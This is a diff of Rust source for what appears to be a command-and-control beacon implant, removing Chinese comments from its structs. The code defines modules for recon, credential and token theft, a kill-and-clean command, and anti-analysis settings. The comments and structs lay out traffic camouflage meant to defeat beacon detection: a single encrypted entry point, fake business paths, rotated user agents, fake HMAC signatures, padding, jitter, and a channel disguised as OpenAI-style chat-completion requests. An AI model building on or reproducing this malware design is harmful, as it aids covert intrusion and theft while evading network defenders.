@@ -43,8 +43,6 @@ pub enum CommandType {
     Proxy,
     FileList,
     FileDrives,
-    /// 通用模块执行：command = 模块名（files/recon/creds/proxy/token/script…），
-    /// arguments[0] = 模块输入 JSON。服务端 relay 任务化的基础。
     Generic,
     KillAndClean,
     Restart,
@@ -306,17 +304,12 @@ pub struct InjectedConfig {
     pub beacon_secret: String,
     #[serde(default, alias = "anti_analysis")]
     pub anti_analysis: AntiAnalysisConfig,
-    // ── 构建时注入的流量伪装（注册后服务端 profile 可覆盖）──────────
-    /// UA 轮换列表（构建页面编辑注入）。
     #[serde(default, alias = "user_agents")]
     pub user_agents: Vec<String>,
-    /// 附加请求头（构建页面编辑注入，格式 "Name: value"）。
     #[serde(default, alias = "extra_headers")]
     pub extra_headers: Vec<String>,
-    /// 虚假业务路径后缀列表（构建页面编辑注入）。
     #[serde(default, alias = "path_suffixes")]
     pub path_suffixes: Vec<String>,
-    /// 服务端 RSA 公钥（SPKI DER b64，构建时注入）：注册/密钥协商混合加密用。
     #[serde(default, alias = "server_public_key")]
     pub server_public_key: String,
 }
@@ -325,70 +318,41 @@ fn default_core_key_path() -> String {
     "/api/beacon/core-key".into()
 }
 
-// ── 流量伪装 Profile（单入口内部路由）──────────────────────────────────
-
-/// 注册响应下发的流量伪装配置。
 ///
-/// 设计：控制面全部走「单入口 POST + 密文内部路由」——
-///   所有 beacon 请求 POST 到 `entry_path`，请求体是业务风格的外层壳：
-///     { "<data_key>": "<AES-GCM 密文>", "<ts_key>": <毫秒时间戳>, "<rand_key>": "<随机hex>" }
-///   密文内部是路由信封（见 `BeaconEnvelope`）：op 决定服务端分发
-///   （心跳/结果/模块下载/注册），agent 标识 token 也在密文内。
 ///
-/// 效果：无固定标识头、无可枚举功能路径、路径/字段名/UA/节奏全部可配置，
-/// 信标检测三要素（路径/头/节奏）随机化。
 #[derive(Debug, Clone, Serialize, Deserialize)]
 #[serde(rename_all = "camelCase")]
 pub struct ProfileTransform {
-    /// 单入口路径前缀（如 /api、/index.php、/graphql）。服务端按此前缀路由，
-    /// 之后的路径段全部忽略（虚假业务地址）。
     #[serde(default = "default_entry_path")]
     pub entry_path: String,
-    /// 虚假业务路径段列表：每次请求随机拼一个到入口后
-    /// （如 /api/user/info、/api/orders/123），空 = 不加后缀。
     #[serde(default)]
     pub path_suffixes: Vec<String>,
-    /// 外层壳：密文字段名。
     #[serde(default = "default_data_key")]
     pub data_key: String,
-    /// 外层壳：时间戳字段名。
     #[serde(default = "default_ts_key")]
     pub ts_key: String,
-    /// 外层壳：随机字段名。
     #[serde(default = "default_rand_key")]
     pub rand_key: String,
-    /// 外层壳：假签名字段名（空 = 不加签名）。
-    /// 值为 HMAC-SHA256(beacon_secret, ts|data) 的 hex —— 真实算法，
-    /// 让请求在结构上等价于带鉴权的业务 API。
     #[serde(default = "default_sign_key")]
     pub sign_key: String,
-    /// 外层壳：会话 token 字段名（服务端路由用；与注册下发 tokenKey 一致）。
     #[serde(default = "default_token_key")]
     pub token_key: String,
-    /// UA 轮换列表（空 = 用构建时的默认 UA）。
     #[serde(default)]
     pub user_agents: Vec<String>,
-    /// 附加请求头（格式 "Name: value"，构造时注入或 profile 下发）。
     #[serde(default)]
     pub extra_headers: Vec<String>,
-    /// 心跳/结果明文尾部随机 padding 字符数范围（密文长度随机化）。
     #[serde(default = "default_padding_min")]
     pub padding_min: u32,
     #[serde(default = "default_padding_max")]
     pub padding_max: u32,
-    /// 心跳间隔（毫秒），注册响应覆盖构建时值。
     #[serde(default)]
     pub heartbeat_interval_ms: u64,
-    /// 抖动百分比（0.0-1.0）。
     #[serde(default)]
     pub jitter_percent: f64,
-    /// AI 通道：伪装请求路径（默认 /v1/chat/completions）。
     #[serde(default = "default_ai_path")]
     pub ai_path: String,
-    /// AI 通道：模型名池（请求随机选一个，需为真实存在的模型名）。
     #[serde(default)]
     pub ai_models: Vec<String>,
-    /// AI 通道：Authorization 前缀（默认 "sk-"）。
     #[serde(default = "default_auth_prefix")]
     pub auth_prefix: String,
 }
@@ -447,15 +411,11 @@ impl Default for ProfileTransform {
     }
 }
 
-/// 密文内部的路由信封：op 决定服务端分发，token 为会话标识。
 #[derive(Debug, Clone, Serialize, Deserialize)]
 #[serde(rename_all = "camelCase")]
 pub struct BeaconEnvelope {
-    /// hb=心跳, res=结果, mod=模块下载, reg=注册
     pub op: String,
-    /// 会话 token（reg 时为注册数据）
     pub id: String,
-    /// 业务数据（JSON 字符串）
     #[serde(default)]
     pub data: String,
 }
